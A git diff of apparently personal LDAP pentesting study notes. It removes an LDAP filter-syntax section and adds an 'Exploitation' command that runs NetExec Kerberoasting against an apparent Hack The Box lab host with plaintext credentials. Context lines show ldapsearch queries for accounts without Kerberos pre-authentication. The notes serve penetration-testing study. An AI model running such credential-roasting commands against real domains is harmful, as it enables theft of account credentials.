@@ -1,22 +1,5 @@
 # LDAP Pentesting Learning Roadmap
 
----
-
-## LDAP Request
-```
-&      AND
-!      NOT
-*      Wildcard
-
-( OPERATOR (IF1)(IF2) ... )
-
-(&(objectClass=user)(givenname=A*))
-
-LDAP ( userAccountControl )    |
-LDAP ( groupType )             |   1.2.840.113556.1.4.803   
-LDAP ( sAMAccountType )        |
-```
-
 ## LDAPSEARCH
 
 ---
@@ -64,6 +47,11 @@ ldapsearch -x -H ldap://DC-IP -D "Administrator@warzone.oxsium.local" -w 'sako20
 # Pre-Auth Not Required
 ldapsearch -x -H ldap://DC-IP -D "Administrator@warzone.oxsium.local" -w 'sako2005!' -b "DC=warzone,DC=oxsium,DC=local" "(&(objectClass=user)(useraccountcontrol:1.2.840.113556.1.4.803:=4194304))"
 ```
+
+### Exploitation
+```powershell
+nxc ldap 10.129.18.236 fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --kerberoasting output.txt
+````
 
 ### LDAP_MATCHING_RULE_BIT_AND
 ```bash
